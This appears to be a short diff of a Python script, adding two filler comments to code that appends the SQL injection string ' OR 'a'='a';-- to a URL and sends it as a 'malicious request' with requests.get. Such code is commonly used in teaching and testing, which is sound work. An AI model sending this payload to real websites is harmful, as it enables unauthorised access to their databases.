@@ -23,7 +23,9 @@ payload = "' OR 'a'='a';--"
 # The final URL with the injected SQL code
 url_with_injected_sql = url + payload
 # Send the malicious request
+# e.g
 response = requests.get(url_with_injected_sql)
+# some other stuff!
 # Print the response
 print(response.text)
 # end if ;)
